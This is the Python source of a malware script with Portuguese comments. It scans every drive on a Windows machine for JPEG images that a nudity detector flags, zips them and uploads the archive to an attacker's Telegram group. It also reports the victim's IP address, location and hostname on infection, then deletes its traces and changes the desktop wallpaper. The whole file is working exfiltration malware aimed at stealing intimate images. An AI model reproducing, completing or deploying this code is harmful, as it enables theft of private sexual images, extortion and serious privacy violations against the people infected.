#!/usr/bin/env python
# coding=utf-8

import nude,datetime,os,zipfile,telepot,requests
from socket import gethostname

#Extensoes de arquivos para procurar os nudes
extensions = ('.jpg','jpeg')

#Executa comando de hostname para pegar o nome do computador
hostname = gethostname()

#Nome do arquivo zipado que vai conter os nudes
zipado = hostname+"_41_M3U5_NUD35.zip"

#Variavel para contar quandos nudes foram encontrados
nudes_founded = 0

#Variavel para contar quandos nao nudes foram encontrados
files_founded = 0

#Link github onde esta hospedado o arquivo com as configuracoes da API
server = 'URL COM ARQUIVO NUDES.CONF'
background_url = "https://uploaddeimagens.com.br/images/000/619/131/full/fundo.jpg?1463080759"

#Nome do arquivo de configuracao apos download
config_file = 'nudes.conf'

#Funcao que faz download do arquivo de conf
def get_conf_file():
    #Faz download do arquivo
    r = requests.get(server)
    #Grava arquivo com o nome que esta na variavel config_file
    with open(config_file,'w') as f:
        f.write(r.content.strip())

#Le as informacoes do arquivo de configuracao
def get_conf():
    #import lib de configparser
    from ConfigParser import ConfigParser
    #Cria objeto do modo confgparser
    config = ConfigParser()
    #Le arquivo de conf
    config.read(config_file)
    #pega as infos da API
    telegram_api = config.get('GLOBAL','telegram_api')
    telegram_group = config.get('GLOBAL','telegram_group')
    #Retorna as infos lidas
    return telegram_api,telegram_group

#Enviar informacoes sobre o IP da vitima
def send_infos():
    #Executa comando de hostname para pegar o nome do computador
    hostname = gethostname()
    #Faz requisicao sobre o IP
    r = requests.get('http://ipinfo.io')
    #Salva o resultado json na variavel infos
    infos = r.json()
    #Pega o horario atual
    time_now = datetime.datetime.utcnow()
    #Envia as informacoes para o atacante pelo telegram
    bot.sendMessage(group_id,'- Victim infected -\nIP Address: '+infos['ip']+'\nCity: '+infos['city']+'\nCountry: '+infos['country']+'\nComputer Hostname: '+hostname+'\nTime of infection:'+str(time_now))

#Funcao responsavel por encontrar os nudes
def find_nudes():
    #Chama variaveis globais
    global files_founded
    global nudes_founded

    #Cria arquivo zipado
    z = zipfile.ZipFile(zipado, "w")

    #Chama funcao responsalve por encontrar todas as particoes
    partitions = find_partitions()

    #Inicia a busca dos nudes particao por particao, arquivo por arquivo.
    for drive in partitions:
        print "Searching for nudes in "+drive
        #Envia ao atacante quando inicia a busca em um drive
        bot.sendMessage(group_id,hostname+' - Searching for nudes in '+drive)
        for root, dirs, files in os.walk(drive):
            for file_n in files:
                #Inserir +1 apos encontrar o arquivo
                files_founded = files_founded + 1
                in_filename = (os.path.join(root, file_n))
                print in_filename
                if file_n.endswith(extensions):
                    #Checa se o arquivo nao esta na pasta windows, caso estiver ele testa. pois demora muito com a pasta windows
                    if 'Windows' not in in_filename:
                        print 'Checking Nude...'
                        #Realiza a checagem do nude
                        try:
                            if nude.is_nude(in_filename) is True:
                                print '[Nude Founded]'
                                print '[Saving]'
                                #Adiciona o arquivo encontrado no arquivo zipado criado la em cima
                                z.write(in_filename)
                                print '[Saved]'
                                #Soma +1 a variavel de nudes
                                nudes_founded = nudes_founded + 1
                        except:
                            pass
        #Envia ao atacante report sobre cada particao
        bot.sendMessage(group_id,hostname+'\nFiles Foundeds: '+str(files_founded)+'\nNudes Founded: '+str(nudes_founded))
        #zera as variaveis
        nudes_founded = 0
        files_founded = 0
    #Apos varrer todas as particoes, fecha o arquivo zipado
    z.close()
    #Funcao responsavel por enviar o arquivo zipado criado
    send_nudes()

#Funcao responsavel por enviar o arquivo zipado criado
def send_nudes():
    #Abre o arquivo zipado e ja envia para o atacante
    bot.sendDocument(group_id, open(zipado, "rb"))

    #Chama funcao responsavel por mudar o plano de fundo
    set_background()

    #Exclui o arquivo zipado e o arquivo de configuracao
    os.remove(zipado)
    os.remove(config_file)

#Funcao responsavel por trocar o plano de fundo apos o final do ataque
def set_background():
    import ctypes
    r = requests.get(background_url)
    with open('fundo.jpg','wb') as f:
        f.write(r.content)
    SPI_SETDESKWALLPAPER = 20
    ctypes.windll.user32.SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, "fundo.jpg" , 0)

#Funcao responsavel por encontrar todas as particoes no sistema Window$
def find_partitions():
    partitions = []
    for i in range(ord('a'), ord('z')+1):
        drive = chr(i)
        if(os.path.exists(drive +":\\")):
            partitions.append(drive +":\\")
    return partitions

#Chama funcao que baixa config
get_conf_file()

#Chama funcao que le o arquivo de config e pega as infos da API
api_key, group_id = get_conf()

#Cria objeto do tipo bot
bot = telepot.Bot(api_key)

#Chama funcao que busca infos do IP da vitima
send_infos()

#Chama funcao que procura os nudes
find_nudes()
